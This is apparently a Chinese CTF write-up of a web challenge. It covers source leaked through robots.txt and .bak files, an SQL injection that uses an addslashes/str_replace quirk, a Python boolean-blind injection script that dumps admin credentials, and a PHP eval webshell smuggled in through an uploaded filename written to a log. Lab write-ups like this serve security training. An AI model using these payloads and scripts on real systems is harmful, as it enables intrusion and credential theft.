![[Pasted image 20230109083406.png|500]]

---
首页长这样

![[Pasted image 20230109083519.png|500]]

---
发现`robots.txt`

```php
/robots.txt
```

```
User-agent: *
Disallow: *.php.bak
```

访问`/index.php.bak`报`404`

`/image.php.bak`可以正常下载

```php
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

`/config.php.bak`也不存在，大致是要在`image.php`的输入转义和替换这里寻找机会。

`addslashes`的作用
```
'   ==>  \'
"   ==>  \"
\   ==>  \\
NUL ==>  \x00
```

`str_replace`的作用
```
\0  ==>
%00 ==>
\'  ==>
'   ==>
```

由于`str_replace`替换`'`，所以添加`'`走不通

```
   (add_slashes)      (str_replace)
\0 =============> \\0 =============> \
```

由于`0`不被`add_slashes`处理，`\0`被`str_replace`处理，能够制造出单个`\`

如此便能对原有查询字符串中的`'`进行转义。巧的是`image.php`的查询有两个条件`id='{$id}'`和`path='{$path}'`，可以通过上面的方式将`id`的后单引号转义，于是`path`的前单引号成为`id`的后单引号，造成`path`参数的逃逸

构造`payload`

```php
/image.php?id=\0&path=or 1=1#
```

![[Pasted image 20230109095330.png|700]]

尝试布尔盲注

```python
import requests
import time
import sys

url = "http://52cd463b-3156-4fa6-b15a-946af9989692.node4.buuoj.cn:81/image.php"

fmt = 'or 0^(ord(substr((select(database())),%d,1))>%d)#'
# false_re = 'exists'

for i in range(0, 100):
    l = 0
    r = 127
    while l < r:
        mid = (l + r) // 2
        payload = fmt % (i, mid)
        params = {'id': '\\0', 'path': payload}
        response = requests.get(url, params)
        time.sleep(0.1)
        # if response.text.find(false_re) >= 0: # mid >= ans
        if len(response.text) < 100:
            r = mid
        else: # mid < ans
            l = mid + 1
    print(chr(l), end='')
    sys.stdout.flush()
```

```
ciscnfinal
```

```python
fmt = 'or 0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)#'
```

```
information_schema,ciscnfinal,exampleDB,mysql,performance_schema
```

```python
# 不能使用单引号
fmt = 'or 0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),%d,1))>%d)#'
```

```
images,users
```

```python
# 用16进制绕过
fmt = 'or 0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=0x7573657273),%d,1))>%d)#'
```

```
username,password
```

```python
fmt = 'or 0^(ord(substr((select(group_concat(username))from(ciscnfinal.users)),%d,1))>%d)#'
```

```
admin
```

```python
fmt = 'or 0^(ord(substr((select(group_concat(password))from(ciscnfinal.users)),%d,1))>%d)#'
```

```
0925553b4e6bcb295be9
```

使用账号密码成功登录

![[Pasted image 20230109114933.png]]

尝试上传木马

```php
<?php eval($_GET['cmd']); ?>
```

```
You cant upload php file.
```

不行QAQ

随便传个文件试试

```
I logged the file name you uploaded to logs/upload.71a36304eac669b32d5fbcdb5625c3f7.log.php. LOL
```

将文件名写入`log`，尝试对文件名下手

```php
# 不能有空格
<?=eval($_GET['cmd']);?>
```

```
I logged the file name you uploaded to logs/upload.71a36304eac669b32d5fbcdb5625c3f7.log.php. LOL
```

```php
/logs/upload.71a36304eac669b32d5fbcdb5625c3f7.log.php?cmd=system('cat /flag');
```

```
User admin uploaded file flag{28a33985-0d91-4a24-a911-ccb78bfbe982}
```

#Web #PHP #源码泄漏 #robots #SQL注入 #布尔盲注 #bypass #字符串逃逸 #addslashes #str_replace